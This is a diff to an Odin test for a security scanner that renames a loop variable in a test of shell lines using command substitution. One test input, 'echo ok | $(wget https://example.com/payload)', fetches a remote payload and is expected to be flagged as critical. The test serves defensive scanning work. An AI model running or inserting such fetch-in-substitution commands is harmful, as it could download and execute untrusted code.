@@ -27,17 +27,17 @@ test_command_substitution_requires_fetch :: proc(t: ^testing.T) {
 		{"echo ok | $(wget https://example.com/payload)", true},
 	}
 
-	for case, idx in cases {
+	for entry, idx in cases {
 		temp_dir := setup_test_environment(fmt.tprintf("coupling_%d", idx))
 		defer teardown_test_environment(temp_dir)
 
-		path := write_coupling_file(temp_dir, fmt.tprintf("case_%d.sh", idx), case.line)
+		path := write_coupling_file(temp_dir, fmt.tprintf("case_%d.sh", idx), entry.line)
 		defer delete(path)
 
 		result := security.scan_module(temp_dir, security.Scan_Options{})
 		defer security.cleanup_scan_result(&result)
 
-		if case.expect_critical {
+		if entry.expect_critical {
 			testing.expect(t, result.critical_count > 0, "command substitution with fetch should be critical")
 		} else {
 			testing.expect(t, result.critical_count == 0, "command substitution without fetch should downgrade")
